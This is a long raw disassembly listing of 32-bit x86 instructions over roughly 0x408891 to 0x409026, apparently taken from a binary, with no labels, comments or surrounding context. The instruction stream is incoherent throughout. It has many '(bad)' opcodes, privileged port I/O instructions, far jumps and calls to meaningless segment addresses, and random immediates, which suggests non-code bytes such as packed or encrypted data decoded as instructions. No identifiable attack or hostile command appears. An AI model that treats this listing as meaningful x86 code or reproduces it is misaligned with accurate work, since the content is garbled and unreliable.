  408891:	push   0x2c
  408893:	or     dl,BYTE PTR [ecx]
  408895:	ins    BYTE PTR es:[edi],dx
  408896:	shl    edx,1
  408898:	xor    BYTE PTR [esi],al
  40889a:	retf   0xbbc
  40889d:	js     0x408834
  40889f:	and    edi,DWORD PTR [eax-0x26]
  4088a2:	mov    ch,dl
  4088a4:	loope  0x40883d
  4088a6:	std    
  4088a7:	sub    BYTE PTR [edx+0x26ae5e62],dl
  4088ad:	mov    bh,0x84
  4088af:	js     0x4088e3
  4088b1:	or     esp,DWORD PTR [edx]
  4088b3:	fisttp WORD PTR [edi-0x32]
  4088b6:	repz push 0x5e3de72b
  4088bc:	ret    0x7e31
  4088bf:	inc    edx
  4088c0:	mov    al,ds:0x89ea3269
  4088c5:	cmp    edx,ebx
  4088c7:	push   edi
  4088c8:	cld    
  4088c9:	inc    esi
  4088ca:	shr    esi,0x6b
  4088cd:	push   eax
  4088ce:	(bad)  
  4088cf:	sbb    ah,BYTE PTR ds:0x209b8adf
  4088d5:	push   es
  4088d6:	inc    ebp
  4088d7:	test   al,0xa0
  4088d9:	push   edi
  4088da:	pop    edx
  4088db:	fcomip st,st(0)
  4088dd:	stos   DWORD PTR es:[edi],eax
  4088de:	cmp    bl,BYTE PTR [ebx]
  4088e0:	fisttp QWORD PTR [ebp-0x380f9a38]
  4088e6:	cld    
  4088e7:	popf   
  4088e8:	jbe    0x408956
  4088ea:	int    0x7b
  4088ec:	ret    
  4088ed:	repz js 0x4088b9
  4088f0:	inc    edi
  4088f1:	fdivr  QWORD PTR [esi+0x53]
  4088f4:	repz jl 0x40890d
  4088f7:	push   ds
  4088f8:	arpl   WORD PTR [edx+0x3b3fd319],di
  4088fe:	or     ecx,DWORD PTR [ebp-0x320e19a9]
  408904:	or     DWORD PTR [edi+0x4a6d3425],ebp
  40890a:	mov    al,0x24
  40890c:	push   ss
  40890d:	jb     0x4088d5
  40890f:	xlat   BYTE PTR ds:[ebx]
  408911:	rcl    DWORD PTR [eax+edi*1],cl
  408914:	sub    esp,DWORD PTR [esi+0x46]
  408917:	lock rcl BYTE PTR [edi+eax*2],0xc0
  40891c:	jns    0x40894c
  40891e:	xchg   edx,eax
  40891f:	ins    BYTE PTR es:[edi],dx
  408920:	push   ds
  408921:	pop    ecx
  408922:	mov    ch,0x7
  408924:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408925:	and    esi,DWORD PTR es:[edi]
  408928:	and    eax,0xd0822a2f
  40892d:	mov    ds:0x38c86af8,eax
  408932:	pop    esp
  408933:	dec    esp
  408934:	and    ch,BYTE PTR [ebp+0xb]
  408937:	xchg   DWORD PTR [edx-0x28],esi
  40893a:	jecxz  0x4089a2
  40893c:	mov    ebp,0xa6609d76
  408941:	sub    ebp,DWORD PTR [edi-0xd6d394c]
  408947:	loope  0x408986
  408949:	call   0x1f515548
  40894e:	aas    
  40894f:	ins    BYTE PTR es:[edi],dx
  408950:	sub    ah,ah
  408952:	pop    esp
  408953:	mov    cl,0xd4
  408955:	sahf   
  408956:	(bad)  
  408958:	mov    bh,0xef
  40895a:	dec    ecx
  40895b:	inc    ebp
  40895c:	mov    dh,0xf9
  40895e:	and    dl,ch
  408960:	dec    ecx
  408961:	pop    esi
  408962:	outs   dx,BYTE PTR ds:[esi]
  408963:	stos   BYTE PTR es:[edi],al
  408964:	xchg   ecx,eax
  408965:	jae    0x408951
  408967:	div    DWORD PTR [esi]
  408969:	mov    ebp,0xbe142ce
  40896e:	daa    
  40896f:	mov    esi,0x58fb3394
  408974:	jne    0x40893f
  408976:	add    BYTE PTR [esi],0x68
  408979:	or     DWORD PTR [esi+0x20c67d62],ecx
  40897f:	imul   DWORD PTR [edi+edi*1-0x21]
  408983:	mov    ecx,0xd220ee5
  408988:	xchg   ebp,eax
  408989:	fwait
  40898a:	push   es
  40898b:	mov    ebx,0x67a7a068
  408990:	adc    eax,0xa43eee71
  408995:	ins    DWORD PTR es:[edi],dx
  408996:	jb     0x4089d2
  408998:	mov    dl,0xcc
  40899a:	jae    0x40899d
  40899c:	push   0x308d74d6
  4089a1:	call   0x4adb:0xe46828be
  4089a8:	xlat   BYTE PTR ds:[ebx]
  4089a9:	xor    eax,0x6a37f1c4
  4089ae:	mov    ch,ah
  4089b0:	mov    esp,0x52b65493
  4089b5:	xor    eax,0xc9f1b207
  4089ba:	test   BYTE PTR [esi-0x7c],0xe8
  4089be:	daa    
  4089bf:	cli    
  4089c0:	mov    ebp,0x5171997e
  4089c5:	mov    esi,0xf08b3f68
  4089ca:	or     eax,DWORD PTR [ecx+edx*2+0x7f]
  4089ce:	mov    ebp,0x4dc5f62e
  4089d3:	push   ecx
  4089d4:	(bad)  
  4089d5:	ja     0x4089db
  4089d7:	ins    DWORD PTR es:[edi],dx
  4089d8:	in     eax,dx
  4089d9:	outs   dx,DWORD PTR ds:[esi]
  4089da:	and    edx,ebp
  4089dc:	push   ss
  4089dd:	add    eax,0x21e9f9c0
  4089e2:	jecxz  0x408a2b
  4089e4:	fbld   TBYTE PTR [esi-0x116bacd2]
  4089ea:	(bad)  
  4089ec:	mov    eax,0x2c82a22e
  4089f1:	popf   
  4089f2:	sub    esi,DWORD PTR [edx-0x2e4d73cd]
  4089f8:	int3   
  4089f9:	dec    ebp
  4089fa:	or     DWORD PTR [ebx],0x60
  4089fd:	ja     0x408a46
  4089ff:	in     al,dx
  408a00:	mov    bl,0x58
  408a02:	ins    BYTE PTR es:[edi],dx
  408a03:	push   0x25
  408a05:	bound  ebx,QWORD PTR [edx-0x47]
  408a08:	sahf   
  408a09:	sub    ebp,ebp
  408a0b:	push   0x1d
  408a0d:	ins    DWORD PTR es:[edi],dx
  408a0e:	and    eax,0x9569f712
  408a13:	pop    edx
  408a14:	xchg   ecx,esp
  408a16:	das    
  408a17:	aaa    
  408a18:	mov    ds:0x66811677,al
  408a1d:	sub    ecx,esi
  408a1f:	(bad)
  408a22:	outs   dx,BYTE PTR ds:[esi]
  408a23:	fimul  DWORD PTR [ebp+0x2a4efdd5]
  408a29:	jl     0x4089e0
  408a2b:	les    eax,FWORD PTR [ebx]
  408a2d:	jg     0x408a27
  408a2f:	jno    0x408a43
  408a31:	in     eax,0xe6
  408a33:	cmp    bl,BYTE PTR [edx+0x58fa879e]
  408a39:	iret   
  408a3a:	scas   eax,DWORD PTR es:[edi]
  408a3b:	mov    edx,eax
  408a3d:	cmc    
  408a3e:	jb     0x408a8a
  408a40:	fs mov edi,ss
  408a43:	push   ebp
  408a44:	fiadd  DWORD PTR [eiz*8-0x25a81070]
  408a4b:	or     edx,DWORD PTR ds:0xb7e5897e
  408a51:	cmp    ch,BYTE PTR [ecx]
  408a53:	imul   edx
  408a55:	push   eax
  408a56:	dec    esp
  408a57:	mov    cl,0x8b
  408a59:	stos   BYTE PTR es:[edi],al
  408a5a:	js     0x408ab5
  408a5c:	ins    BYTE PTR es:[edi],dx
  408a5d:	add    BYTE PTR [esp+ebp*2-0x1fff6409],bl
  408a64:	pop    edx
  408a65:	push   edx
  408a66:	add    al,0x17
  408a68:	dec    edx
  408a69:	xchg   ecx,eax
  408a6a:	xor    ch,bl
  408a6c:	push   ss
  408a6d:	mov    edi,DWORD PTR [edx+0x68484d9f]
  408a73:	icebp  
  408a74:	cmp    DWORD PTR [esi-0x2b],ebp
  408a77:	push   0xa7484f82
  408a7c:	inc    ecx
  408a7d:	imul   esi,DWORD PTR [ebx+0x73],0x7a
  408a81:	push   ebp
  408a82:	xchg   ebx,eax
  408a83:	dec    eax
  408a84:	cmp    eax,0x83e39062
  408a89:	lahf   
  408a8a:	mov    al,ds:0x81c03fe4
  408a8f:	test   eax,0xe65a3e6b
  408a94:	cmp    dl,BYTE PTR [edi+0x3a2c426f]
  408a9a:	test   edi,0x7785097c
  408aa0:	and    al,0x2a
  408aa2:	rcl    eax,cl
  408aa4:	mov    eax,ds:0x423eb4de
  408aa9:	pusha  
  408aaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aab:	mov    ds:0xf6b2dabd,eax
  408ab0:	sar    BYTE PTR [edi+ecx*2+0x3a],cl
  408ab4:	cmp    esp,DWORD PTR [edx-0x5f3c896a]
  408aba:	jp     0x408b1d
  408abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408abd:	dec    edx
  408abe:	dec    edx
  408abf:	push   ecx
  408ac0:	lods   al,BYTE PTR ds:[esi]
  408ac1:	test   al,0xff
  408ac3:	sbb    eax,0x259a9531
  408ac8:	mov    edx,0x984f0aef
  408acd:	add    eax,0xaf91ee09
  408ad2:	test   DWORD PTR [ebx+eiz*2-0x3b0f1ce6],0x1f7255b3
  408add:	mov    dh,0x59
  408adf:	pop    edi
  408ae0:	scas   eax,DWORD PTR es:[edi]
  408ae1:	lahf   
  408ae2:	inc    eax
  408ae3:	and    DWORD PTR [ebx],0x770fb51f
  408ae9:	jge    0x408b48
  408aeb:	jle    0x408b0a
  408aed:	ret    0x5fbb
  408af0:	sub    ah,BYTE PTR [esi+0x5b]
  408af3:	retf   
  408af4:	add    al,0x1
  408af6:	(bad)  
  408af7:	and    dh,BYTE PTR ds:[edx-0x5bd66edf]
  408afe:	retf   
  408aff:	lods   eax,DWORD PTR ds:[esi]
  408b00:	mov    bh,0x89
  408b02:	retf   
  408b03:	scas   al,BYTE PTR es:[edi]
  408b04:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  408b06:	jbe    0x408b6a
  408b08:	pop    ebx
  408b09:	push   cs
  408b0a:	test   DWORD PTR [eax-0x13],0x4be1ad9f
  408b11:	popf   
  408b12:	inc    esp
  408b13:	xchg   ebp,eax
  408b14:	sub    esi,edi
  408b16:	xor    dl,BYTE PTR [ebx-0x2ce5dd5e]
  408b1c:	ja     0x408b83
  408b1e:	ss push edx
  408b20:	cmc    
  408b21:	stos   DWORD PTR es:[edi],eax
  408b22:	loopne 0x408b2b
  408b24:	push   ebx
  408b25:	xchg   BYTE PTR [eax],bh
  408b27:	jb     0x408b5c
  408b29:	xchg   edi,eax
  408b2a:	cwde   
  408b2b:	out    0xbb,al
  408b2d:	popf   
  408b2e:	rol    DWORD PTR [edx],cl
  408b30:	jp     0x408abe
  408b32:	fild   QWORD PTR [ebp+0x1c]
  408b35:	popa   
  408b36:	jno    0x408b7c
  408b38:	lahf   
  408b39:	popa   
  408b3a:	test   DWORD PTR [esp+ecx*1],edx
  408b3d:	or     dh,cl
  408b3f:	add    ecx,DWORD PTR [ebx-0x632487b1]
  408b45:	mov    dl,0xa8
  408b47:	lods   eax,DWORD PTR ds:[esi]
  408b48:	or     ch,BYTE PTR ds:0xb72d38f
  408b4e:	les    edi,FWORD PTR cs:[ecx+0x74494443]
  408b55:	les    ebp,FWORD PTR [ebx+0x14]
  408b58:	mov    WORD PTR [ebp-0x48],ss
  408b5b:	add    bl,BYTE PTR [esi]
  408b5d:	push   ecx
  408b5e:	sbb    BYTE PTR [ecx-0x6a5187b5],dh
  408b64:	neg    BYTE PTR [eax]
  408b66:	test   BYTE PTR [ecx-0x35b1d468],ah
  408b6c:	pop    eax
  408b6d:	add    al,bl
  408b6f:	imul   ebp,DWORD PTR [edi+0x2b28e9f7],0x39
  408b76:	xchg   ebx,eax
  408b77:	mov    ds:0x44651500,eax
  408b7c:	mov    bl,0x37
  408b7e:	iret   
  408b7f:	nop
  408b80:	push   edx
  408b81:	or     eax,0x42aafbd
  408b86:	mov    esp,0x48877ec9
  408b8b:	dec    edx
  408b8c:	dec    edx
  408b8d:	mov    fs,WORD PTR [ebp-0x49]
  408b90:	aas    
  408b91:	scas   eax,DWORD PTR es:[edi]
  408b92:	mov    ebx,0x9ff5a91d
  408b97:	inc    esi
  408b98:	les    eax,FWORD PTR [esi-0x14]
  408b9b:	cmp    DWORD PTR [eax+0x6d7134e2],esi
  408ba1:	ficom  WORD PTR [ecx+ebx*4]
  408ba4:	mov    ah,0xdb
  408ba6:	dec    ebx
  408ba7:	lahf   
  408ba8:	scas   al,BYTE PTR es:[edi]
  408ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408baa:	mov    ds:0xbf7ad091,eax
  408baf:	jae    0x408c28
  408bb1:	dec    esi
  408bb2:	xchg   edx,eax
  408bb3:	jns    0x408bc5
  408bb5:	mov    esp,0xa172537f
  408bba:	sbb    al,0x19
  408bbc:	ret    0x4200
  408bbf:	loopne 0x408b67
  408bc1:	or     ch,BYTE PTR [ecx+0x7]
  408bc4:	cmp    al,0x93
  408bc6:	cmp    BYTE PTR [ecx+0x47],al
  408bc9:	dec    esi
  408bca:	xchg   ebx,eax
  408bcb:	outs   dx,DWORD PTR ds:[esi]
  408bcc:	jecxz  0x408ba0
  408bce:	and    al,0x4e
  408bd0:	push   ecx
  408bd1:	out    dx,eax
  408bd2:	mov    edx,0xc89971b7
  408bd7:	lds    eax,FWORD PTR [esi+0x56ec425a]
  408bdd:	push   ebp
  408bde:	or     DWORD PTR [esi+0x53],ecx
  408be1:	loop   0x408b7a
  408be3:	xor    eax,0x2bea393f
  408be8:	or     al,ah
  408bea:	test   al,0xbb
  408bec:	fnstsw WORD PTR [edi+esi*1-0x753f0a46]
  408bf3:	sub    DWORD PTR [eax+0xa],edx
  408bf6:	adc    BYTE PTR ss:[edi+0x77845b96],0x46
  408bfe:	out    dx,al
  408bff:	ret    0xf26b
  408c02:	fimul  WORD PTR [edi+0x2]
  408c05:	jae    0x408b93
  408c07:	and    ebp,esp
  408c09:	rcr    BYTE PTR ds:[eax+0x5d690f4c],cl
  408c10:	add    edi,DWORD PTR [edx-0x5f]
  408c13:	dec    ebp
  408c14:	lock int3 
  408c16:	cdq    
  408c17:	xchg   esp,eax
  408c18:	cmp    eax,0x99e475df
  408c1d:	sub    BYTE PTR [ebp-0x47],dl
  408c20:	addr16 dec ebx
  408c22:	pop    ebx
  408c23:	inc    ebp
  408c24:	xlat   BYTE PTR ds:[ebx]
  408c25:	sbb    cl,ah
  408c27:	lds    eax,FWORD PTR [edi+0x5524869e]
  408c2d:	out    dx,al
  408c2e:	add    DWORD PTR [esi],0x4f
  408c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c32:	or     eax,0xece48e21
  408c37:	or     bh,bh
  408c39:	les    esp,FWORD PTR [eax-0x577452c9]
  408c3f:	mov    WORD PTR [esi+eax*4],?
  408c42:	js     0x408c0f
  408c44:	(bad)  
  408c45:	cli    
  408c46:	and    dl,BYTE PTR [eax-0x7c8b2730]
  408c4c:	and    BYTE PTR ds:0x90dda0ab,dh
  408c52:	dec    edi
  408c53:	bound  edx,QWORD PTR [esi-0x1922ee77]
  408c59:	imul   esi,DWORD PTR [eax-0x6b],0xffffffc9
  408c5d:	sub    BYTE PTR [edi-0x80],ah
  408c60:	xchg   ebx,eax
  408c61:	sbb    dh,al
  408c63:	and    BYTE PTR [ebx],bh
  408c65:	fisttp DWORD PTR [eax]
  408c67:	call   0x7320:0x9360328
  408c6e:	dec    edx
  408c6f:	jb     0x408c1d
  408c71:	mov    ds:0x8e556b4f,al
  408c76:	and    ch,ah
  408c78:	int    0x12
  408c7a:	pop    ss
  408c7b:	push   ebx
  408c7c:	push   es
  408c7d:	dec    eax
  408c7e:	pop    ebp
  408c7f:	ret    
  408c80:	push   edi
  408c81:	dec    esi
  408c82:	repz dec DWORD PTR [edx+ebx*1+0x28e20758]
  408c8a:	lds    eax,FWORD PTR [edi]
  408c8c:	and    bh,dh
  408c8e:	jl     0x408cad
  408c90:	sub    esp,esp
  408c92:	daa    
  408c93:	jg     0x408c18
  408c95:	dec    esi
  408c96:	push   ebx
  408c97:	or     DWORD PTR [ebx-0x571a0f71],0x88af3ed8
  408ca1:	dec    edi
  408ca2:	mov    esi,0xc8052396
  408ca7:	sti    
  408ca8:	ds addr16 das 
  408cab:	inc    edx
  408cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cad:	mov    dh,0xa8
  408caf:	mov    BYTE PTR [esp+eiz*4+0x3dae909a],dh
  408cb6:	adc    BYTE PTR [eax+0x733c6ab8],bl
  408cbc:	int3   
  408cbd:	push   ecx
  408cbe:	inc    edi
  408cbf:	dec    eax
  408cc0:	mov    eax,ds:0xa99e7261
  408cc5:	pop    ecx
  408cc6:	outs   dx,DWORD PTR ds:[esi]
  408cc7:	rcr    DWORD PTR [ecx-0x12],0xb7
  408ccb:	push   ss
  408ccc:	mov    esi,0x9bc68b35
  408cd1:	inc    ecx
  408cd2:	mov    cl,0x40
  408cd4:	jmp    0x408cef
  408cd6:	mov    ds:0x256acf35,eax
  408cdb:	cmp    DWORD PTR [esi+ebp*2-0x19],ebx
  408cdf:	mov    ch,0x68
  408ce1:	stos   DWORD PTR es:[edi],eax
  408ce2:	mov    al,ds:0x40a6d96d
  408ce7:	and    ebp,DWORD PTR [bp+si+0x6b]
  408ceb:	lahf   
  408cec:	dec    eax
  408ced:	mov    dl,0xba
  408cef:	xchg   ecx,eax
  408cf0:	push   esi
  408cf1:	ss sub al,0x32
  408cf4:	or     edi,DWORD PTR [eax-0x20]
  408cf7:	test   eax,0x90c49fe8
  408cfc:	aad    0x6b
  408cfe:	fdivr  st,st(5)
  408d00:	retf   
  408d01:	mov    dl,0x48
  408d03:	add    DWORD PTR [edx],edi
  408d05:	dec    ebp
  408d06:	mov    ch,dh
  408d08:	and    ebp,ebx
  408d0a:	cmp    eax,0x664c55ea
  408d0f:	or     al,0x17
  408d11:	lock push eax
  408d13:	xchg   esp,eax
  408d14:	push   0xb208041d
  408d19:	aam    0x45
  408d1b:	test   BYTE PTR [esi-0x3e7b98ee],dh
  408d21:	scas   al,BYTE PTR es:[edi]
  408d22:	hlt    
  408d23:	pusha  
  408d24:	(bad)  
  408d25:	mov    ch,0xd4
  408d27:	inc    edx
  408d28:	sbb    eax,0xeda4f11e
  408d2d:	push   0x4e3f6d17
  408d32:	push   ebp
  408d33:	aas    
  408d34:	and    bh,BYTE PTR [eax-0x12d4346d]
  408d3a:	or     al,0xb0
  408d3c:	in     al,dx
  408d3d:	xchg   ebp,eax
  408d3e:	loope  0x408d06
  408d40:	push   ebp
  408d41:	xchg   edx,eax
  408d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d43:	iret   
  408d44:	or     bh,0xde
  408d47:	repz cdq 
  408d49:	in     eax,0x13
  408d4b:	xchg   ecx,eax
  408d4c:	mov    al,0x87
  408d4e:	push   edx
  408d4f:	in     al,0x78
  408d51:	xor    DWORD PTR [edi+0x5280c11e],ebx
  408d57:	sub    esi,DWORD PTR [eax+esi*4-0x1f27cd11]
  408d5e:	(bad)  
  408d5f:	pushf  
  408d60:	cld    
  408d61:	outs   dx,BYTE PTR ds:[esi]
  408d62:	lea    di,[ecx]
  408d65:	cs mov ebp,0xc716a33f
  408d6b:	inc    DWORD PTR [ebx]
  408d6d:	mov    WORD PTR [edi],?
  408d6f:	mov    al,ds:0xd5ad0c1a
  408d74:	jbe    0x408d91
  408d76:	(bad)  
  408d77:	stos   DWORD PTR es:[edi],eax
  408d78:	mov    dh,0xa8
  408d7a:	neg    BYTE PTR [eiz*1-0x31b09d5a]
  408d81:	js     0x408dcc
  408d83:	jae    0x408d1d
  408d85:	jmp    DWORD PTR [esi+0x6b]
  408d88:	xor    eax,0xa21f585d
  408d8d:	lahf   
  408d8e:	xor    DWORD PTR [esi+0x52],esi
  408d91:	cmp    DWORD PTR [ebp-0x1a452733],edi
  408d97:	in     al,dx
  408d98:	xchg   ecx,eax
  408d99:	fwait
  408d9a:	pop    edx
  408d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d9c:	cmp    bl,BYTE PTR [eax+0x53]
  408d9f:	in     al,dx
  408da0:	scas   eax,DWORD PTR es:[edi]
  408da1:	mov    al,BYTE PTR [esi]
  408da3:	lds    ecx,FWORD PTR [ebx+eiz*1+0x35d4e4b]
  408daa:	popa   
  408dab:	mov    bh,0x24
  408dad:	adc    DWORD PTR [edx-0x229985d5],0xffffffd8
  408db4:	data16 mov WORD PTR [ebx-0x1c1e4cce],ss
  408dbb:	sub    BYTE PTR [edi+edx*1+0x67],0x6e
  408dc0:	imul   edx,DWORD PTR [ecx+0x72],0xf13dbcef
  408dc7:	jno    0x408e24
  408dc9:	pop    ds
  408dca:	hlt    
  408dcb:	sar    DWORD PTR [edi],cl
  408dcd:	test   al,0x8d
  408dcf:	inc    edx
  408dd0:	out    0x84,ax
  408dd3:	int3   
  408dd4:	(bad)  
  408dd5:	sub    dl,BYTE PTR [ecx]
  408dd7:	inc    ebx
  408dd8:	push   es
  408dd9:	into   
  408dda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ddb:	pop    edx
  408ddc:	(bad)  
  408ddd:	(bad)  
  408ddf:	inc    ecx
  408de0:	and    dh,BYTE PTR [ebx]
  408de2:	stos   BYTE PTR es:[edi],al
  408de3:	push   cs
  408de4:	lods   al,BYTE PTR ds:[esi]
  408de5:	ja     0x408e22
  408de7:	repnz pop edx
  408de9:	push   esi
  408dea:	sbb    eax,0xff5cf023
  408def:	mul    ah
  408df1:	cwde   
  408df2:	pop    edi
  408df3:	jo     0x408e0b
  408df5:	ja     0x408db0
  408df7:	mov    cl,0xb2
  408df9:	jbe    0x408e30
  408dfb:	or     eax,0x1669fdf3
  408e00:	or     BYTE PTR [eax-0x1e93dff5],al
  408e06:	das    
  408e07:	je     0x408df9
  408e09:	stos   DWORD PTR es:[edi],eax
  408e0a:	adc    eax,0xbed54595
  408e0f:	adc    ch,BYTE PTR [esp+edi*1+0x64ec77d7]
  408e16:	push   ss
  408e17:	cmp    al,BYTE PTR [esp+edi*8]
  408e1a:	dec    ebp
  408e1b:	and    BYTE PTR [edx+0x6d2bbaca],bh
  408e21:	imul   edi,eax,0x55
  408e24:	and    dh,BYTE PTR fs:[ecx+0x3]
  408e28:	fcompp 
  408e2a:	mul    BYTE PTR [esi-0x1fc27eff]
  408e30:	mov    eax,DWORD PTR [eax-0x15f09ca3]
  408e36:	cwde   
  408e37:	adc    ebp,DWORD PTR [esp+esi*2]
  408e3a:	dec    ebx
  408e3b:	int3   
  408e3c:	mov    ah,BYTE PTR [ebx-0x260138ef]
  408e42:	add    eax,ebx
  408e44:	sub    al,0x88
  408e46:	daa    
  408e47:	cmp    DWORD PTR [ecx+0x15],eax
  408e4a:	mov    al,ds:0xf76e469a
  408e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e50:	out    0x1a,eax
  408e52:	jnp    0x408e88
  408e54:	push   ss
  408e55:	mov    eax,ds:0xa8ade9a5
  408e5a:	adc    DWORD PTR [edx+0x4c],eax
  408e5d:	sub    edx,DWORD PTR [ecx]
  408e5f:	rol    BYTE PTR ds:0xc4320d39,cl
  408e65:	icebp  
  408e66:	ss lock push ds
  408e69:	sbb    eax,ebp
  408e6b:	push   eax
  408e6c:	pop    ds
  408e6d:	aad    0x3b
  408e6f:	jnp    0x408ee0
  408e71:	(bad)  
  408e72:	jnp    0x408ee3
  408e74:	in     al,dx
  408e75:	adc    eax,0xe45222ce
  408e7a:	aaa    
  408e7b:	push   ss
  408e7c:	in     al,0xbd
  408e7e:	pop    edx
  408e7f:	cmp    ebx,DWORD PTR [esi]
  408e81:	sub    DWORD PTR [eax+0x1f3a506b],ecx
  408e87:	frstor [esi+eax*8+0x3a]
  408e8b:	push   eax
  408e8c:	sbb    eax,0x33a58462
  408e91:	fs (bad) 
  408e93:	and    edi,esp
  408e95:	pop    es
  408e96:	ds inc edx
  408e98:	adc    edi,DWORD PTR [eiz*2+0x383568d8]
  408e9f:	adc    DWORD PTR cs:[edi-0x68],esi
  408ea3:	xor    eax,0x2d668e24
  408ea8:	xor    BYTE PTR [ebp-0x4734e0c1],bh
  408eae:	gs clc 
  408eb0:	inc    edx
  408eb1:	clc    
  408eb2:	sub    edi,DWORD PTR [esi]
  408eb4:	sub    bh,BYTE PTR [ecx+ecx*2]
  408eb7:	ins    DWORD PTR es:[edi],dx
  408eb8:	aad    0x50
  408eba:	pop    esp
  408ebb:	arpl   WORD PTR [eax-0x3839cfd0],di
  408ec1:	ret    0xe10e
  408ec4:	in     al,0xda
  408ec6:	add    BYTE PTR [ebx+0x4dd67038],dh
  408ecc:	push   edi
  408ecd:	pop    esi
  408ece:	pop    edx
  408ecf:	pop    ebx
  408ed0:	jae    0x408eb3
  408ed2:	add    DWORD PTR [ecx+0x9],0xffffffda
  408ed6:	sbb    DWORD PTR [ecx],ecx
  408ed8:	mov    al,0x48
  408eda:	mul    DWORD PTR [esi-0x2d]
  408edd:	rcr    cl,cl
  408edf:	sub    dh,BYTE PTR [edi]
  408ee1:	jle    0x408ef3
  408ee3:	sbb    edx,0xc85d0b58
  408ee9:	pop    ds
  408eea:	lds    ecx,FWORD PTR [eax-0xd]
  408eed:	xchg   esp,eax
  408eee:	ret    0xf0c9
  408ef1:	push   ds
  408ef2:	fmulp  st(2),st
  408ef4:	and    DWORD PTR [edi-0x1cf175ed],edx
  408efa:	lea    esp,[ebp+0x30]
  408efd:	inc    ecx
  408efe:	ins    DWORD PTR es:[edi],dx
  408eff:	call   0x93e1:0x8c37cbdc
  408f06:	fs int 0xc5
  408f09:	loop   0x408f27
  408f0b:	test   ebx,edx
  408f0d:	jg     0x408ed0
  408f0f:	data16 int 0x56
  408f12:	adc    al,0x6d
  408f14:	adc    dh,dl
  408f16:	sbb    BYTE PTR [edi+0x179c7d52],bh
  408f1c:	mov    DWORD PTR ds:0x69f50d02,esp
  408f22:	repnz xchg edi,eax
  408f24:	imul   eax,ebx,0x324c013c
  408f2a:	jecxz  0x408edf
  408f2c:	ins    DWORD PTR es:[edi],dx
  408f2d:	int    0xb
  408f2f:	adc    DWORD PTR [edi+edi*1+0x5f],eax
  408f33:	push   eax
  408f34:	pop    ss
  408f35:	pop    ecx
  408f36:	mov    ds:0xc88a2486,eax
  408f3b:	outs   dx,BYTE PTR ds:[esi]
  408f3c:	dec    edx
  408f3d:	adc    BYTE PTR [esi+0x746588b9],bh
  408f43:	fidivr WORD PTR [ebp+0x5ffe4c90]
  408f49:	pusha  
  408f4a:	jl     0x408f02
  408f4c:	push   edi
  408f4d:	js     0x408fad
  408f4f:	js     0x408ed8
  408f51:	lock btr DWORD PTR [ecx+0x2],ebx
  408f56:	ror    ebx,cl
  408f58:	jo     0x408fc4
  408f5a:	scas   al,BYTE PTR es:[edi]
  408f5b:	jne    0x408f85
  408f5d:	xchg   ebp,eax
  408f5e:	jmp    0xe7c5:0x3228b88e
  408f65:	sbb    al,0x9f
  408f67:	dec    esp
  408f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f69:	push   0x28
  408f6b:	xchg   BYTE PTR [ecx-0x36],bh
  408f6e:	idiv   BYTE PTR [edx-0x3732cecb]
  408f74:	xor    edi,edx
  408f76:	jecxz  0x408f36
  408f78:	adc    ebp,DWORD PTR [ebp-0x5f3b561]
  408f7e:	inc    edx
  408f7f:	ret    
  408f80:	push   es
  408f81:	add    edi,0x2
  408f84:	leave  
  408f85:	jge    0x408f65
  408f87:	cmp    esp,DWORD PTR [ecx]
  408f89:	repnz repnz pop edx
  408f8c:	pop    edx
  408f8d:	leave  
  408f8e:	iret   
  408f8f:	cli    
  408f90:	add    edi,edi
  408f92:	loop   0x408f93
  408f94:	push   ds
  408f95:	inc    ecx
  408f96:	std    
  408f97:	lock daa 
  408f99:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  408f9b:	into   
  408f9c:	(bad)  
  408f9d:	out    dx,al
  408f9e:	inc    esp
  408f9f:	jp     0x409016
  408fa1:	xor    al,0x16
  408fa3:	mov    cl,0x2c
  408fa5:	inc    eax
  408fa6:	mov    dl,0xc
  408fa8:	jle    0x408f68
  408faa:	xor    DWORD PTR [esi],edx
  408fac:	jnp    0x82d1e9f9
  408fb2:	push   eax
  408fb3:	hlt    
  408fb4:	mov    bh,0xc5
  408fb6:	cmp    al,0x98
  408fb8:	xor    eax,0x4f6d03d0
  408fbd:	xchg   edx,eax
  408fbe:	pusha  
  408fbf:	or     ebp,DWORD PTR [eax+0x4ba3924e]
  408fc5:	arpl   WORD PTR [edx],sp
  408fc7:	sahf   
  408fc8:	lods   al,BYTE PTR ds:[esi]
  408fc9:	mov    ebp,ds
  408fcb:	fs addr16 inc edx
  408fce:	jmp    0x1241:0xf24cba40
  408fd5:	xchg   edi,eax
  408fd6:	add    BYTE PTR [ecx+0xc32966],al
  408fdc:	push   ecx
  408fdd:	(bad)  
  408fde:	push   0x84524668
  408fe3:	iret   
  408fe4:	inc    ebp
  408fe5:	inc    eax
  408fe6:	jns    0x408fb6
  408fe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fe9:	fist   WORD PTR [esi]
  408feb:	outs   dx,BYTE PTR ds:[esi]
  408fec:	dec    edx
  408fed:	cdq    
  408fee:	out    dx,eax
  408fef:	outs   dx,DWORD PTR es:[esi]
  408ff1:	aam    0xdd
  408ff3:	dec    ebp
  408ff4:	mov    ecx,0x7c15f18b
  408ff9:	and    al,0xf8
  408ffb:	rcr    esp,1
  408ffd:	aaa    
  408ffe:	push   0xffffff97
  409000:	and    ch,dl
  409002:	test   eax,0xec64cd7d
  409007:	into   
  409008:	(bad)  
  409009:	jne    0x40907a
  40900b:	fbld   TBYTE PTR [edx]
  40900d:	jo     0x409048
  40900f:	mov    dl,al
  409011:	das    
  409012:	stos   DWORD PTR es:[edi],eax
  409013:	fisubr DWORD PTR [esi-0x38911eb3]
  409019:	inc    ecx
  40901a:	mov    BYTE PTR [edi-0x7b],dh
  40901d:	rcl    DWORD PTR [edi-0x4cff6229],1
  409023:	xor    al,bl
  409025:	pop    ss
  409026:	pop    ss
